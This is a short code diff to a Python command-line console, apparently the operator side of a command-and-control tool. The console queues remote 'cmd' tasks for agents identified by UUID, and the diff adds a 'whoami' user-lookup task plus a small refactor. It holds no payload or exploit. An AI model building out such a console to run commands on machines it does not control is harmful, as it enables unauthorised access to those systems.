@@ -107,6 +107,13 @@ class ImhulluCLI(cmd.Cmd):
 
         tableprint.table(agents, headers)
 
+    def _create_task(self, task):
+        """general function for creating tasks\nevery task creation function calls this"""
+        endpoint = "/create_task/"
+        task_json = json.dumps(task)
+        response = self._api_post_req(endpoint, task_json, self._agent_uuid)
+        return response
+
     @agent_uuid_required
     def do_cmd(self, args):
         """create a new cmd task\n\tUsage: <command> <arg1> <arg2> ...\n"""
@@ -122,10 +129,18 @@ class ImhulluCLI(cmd.Cmd):
             "agent_uuid": self._agent_uuid
         }
 
-        endpoint = "/create_task/"
-        task_json = json.dumps(task)
-        response = self._api_post_req(endpoint, task_json, self._agent_uuid)
-        print(response)
+        print(self._create_task(task))
+
+    @agent_uuid_required
+    def do_whoami(self, line):
+        """get user info through GetUserName\nUsage: <command>\n"""
+        task = {
+            "task": "",
+            "task_type": InputType.Whoami.value,
+            "agent_uuid": self._agent_uuid
+        }
+
+        print(self._create_task(task))
 
     @agent_uuid_required
     def do_list_tasks(self, args):
@@ -140,6 +155,7 @@ class ImhulluCLI(cmd.Cmd):
 
         if len(tasks) == 0:
             print("Task queue empty\n")
+            return
 
         tableprint.table(tasks, headers)
 
